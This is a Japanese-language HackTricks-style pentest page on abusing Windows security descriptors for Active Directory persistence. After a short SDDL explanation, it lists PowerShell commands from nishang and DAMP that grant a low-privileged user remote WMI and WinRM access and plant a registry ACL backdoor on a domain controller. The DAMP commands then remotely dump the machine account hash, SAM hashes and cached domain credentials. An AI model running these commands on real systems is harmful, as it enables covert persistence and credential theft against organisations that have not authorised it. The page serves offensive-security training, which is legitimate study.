# セキュリティ記述子

{{#include ../../banners/hacktricks-training.md}}

## セキュリティ記述子

[ドキュメントより](https://learn.microsoft.com/en-us/windows/win32/secauthz/security-descriptor-definition-language): Security Descriptor Definition Language (SDDL) は、セキュリティ記述子の記述に使用される形式を定義します。SDDL は DACL および SACL に ACE 文字列を使用します: `ace_type;ace_flags;rights;object_guid;inherit_object_guid;account_sid;`<sup>[[1]](#references)</sup>

**セキュリティ記述子**は、**オブジェクト**が別の**オブジェクトに対して**持つ**権限**を**格納**するために使用されます。オブジェクトの**セキュリティ記述子**に**少し変更を加える**だけで、特権グループのメンバーになることなく、そのオブジェクトに対する非常に興味深い権限を取得できます。

したがって、この persistence technique は、特定のオブジェクトに対して必要なすべての権限を獲得し、通常は admin privileges が必要なタスクを、admin である必要なく実行できる能力に基づいています。

### WMI へのアクセス

ユーザーに**リモートで WMI を実行する**権限を、[**これを使用して**](https://github.com/samratashok/nishang/blob/master/Backdoors/Set-RemoteWMI.ps1)<sup>[[2]](#references)</sup>付与できます:
```bash
Set-RemoteWMI -UserName student1 -ComputerName dcorp-dc –namespace 'root\cimv2' -Verbose
Set-RemoteWMI -UserName student1 -ComputerName dcorp-dc–namespace 'root\cimv2' -Remove -Verbose #Remove
```
### WinRM へのアクセス

**ユーザーに winrm PS console へのアクセス権を付与** [**これを使用**](https://github.com/samratashok/nishang/blob/master/Backdoors/Set-RemoteWMI.ps1)**:**<sup>[[2]](#references)</sup>
```bash
Set-RemotePSRemoting -UserName student1 -ComputerName <remotehost> -Verbose
Set-RemotePSRemoting -UserName student1 -ComputerName <remotehost> -Remove #Remove
```
### ハッシュへのリモートアクセス

**DAMP** を使用して **Reg backdoor を作成し**、**registry** にアクセスして **hashes を dump** すると、いつでも **computer の hash**、**SAM**、および computer 内の **cached AD credential** を取得できます。そのため、**Domain Controller computer** に対して **regular user** にこの permission を与えることは非常に有用です:<sup>[[3]](#references)</sup>
```bash
# allows for the remote retrieval of a system's machine and local account hashes, as well as its domain cached credentials.
Add-RemoteRegBackdoor -ComputerName <remotehost> -Trustee student1 -Verbose

# Abuses the ACL backdoor set by Add-RemoteRegBackdoor to remotely retrieve the local machine account hash for the specified machine.
Get-RemoteMachineAccountHash -ComputerName <remotehost> -Verbose

# Abuses the ACL backdoor set by Add-RemoteRegBackdoor to remotely retrieve the local SAM account hashes for the specified machine.
Get-RemoteLocalAccountHash -ComputerName <remotehost> -Verbose

# Abuses the ACL backdoor set by Add-RemoteRegBackdoor to remotely retrieve the domain cached credentials for the specified machine.
Get-RemoteCachedCredential -ComputerName <remotehost> -Verbose
```
[**Silver Tickets**](silver-ticket.md) を確認して、Domain Controller のコンピューターアカウントの hash をどのように使用できるか学びましょう。

## 参考資料

- [1] [Security Descriptor Definition Language - Microsoft Learn](https://learn.microsoft.com/en-us/windows/win32/secauthz/security-descriptor-definition-language)
- [2] [nishang - Set-RemoteWMI.ps1](https://github.com/samratashok/nishang/blob/master/Backdoors/Set-RemoteWMI.ps1)
- [3] [DAMP - Discretionary ACL Modification Project](https://github.com/HarmJ0y/DAMP)

{{#include ../../banners/hacktricks-training.md}}
